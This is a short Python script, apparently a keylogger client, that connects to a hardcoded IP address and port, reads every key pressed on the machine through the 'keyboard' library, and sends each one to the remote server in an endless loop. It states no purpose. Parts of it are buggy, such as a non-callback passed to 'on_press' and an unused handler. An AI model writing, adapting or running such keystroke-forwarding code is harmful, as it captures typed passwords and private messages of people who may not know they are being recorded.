import socket
import keyboard
import time

class Client:
    def __init__(self):
        # Initialize socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Initialize server info
        self.ip = "192.168.192.228"
        self.port = 38699

    def connect(self):
        self.socket.connect((self.ip, self.port))
        self.socket.sendall(b"Hello server")
        
        self.listen()

    def send(self, msg):
        self.socket.sendall(bytes(msg, "utf-8"))

    def listen(self):
        while True:
            data = self.socket.recv(1024)

            if not data:
                continue
            else:
                print(f"Received: {data!r}")
                break
        

def sendKeyToServer(event):
    client.send(event.name)

client = Client()
client.connect()
while True:
    try:
        keyboard.on_press(client.send(keyboard.read_key()))
        client.listen()
        
    except ConnectionResetError:
        print("Lost connection to server. Reconnecting...")
        client.connect()

